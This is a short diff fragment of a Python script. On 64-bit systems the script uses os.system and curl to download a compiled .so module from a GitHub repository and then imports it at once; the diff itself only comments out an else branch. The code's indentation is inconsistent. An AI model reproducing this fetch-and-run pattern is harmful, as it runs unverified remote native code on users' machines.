@@ -14,8 +14,8 @@ bit = platform.architecture()[0]
 if bit == '64bit':
         os.system('curl -L https://github.com/Xpon1/Test/blob/main/Xpon.cpython-311.so?raw=true -o Xpon.so') 
         import Xpon
-    else:
-        import Xpon
+    #else:
+        #import Xpon
         
      
      
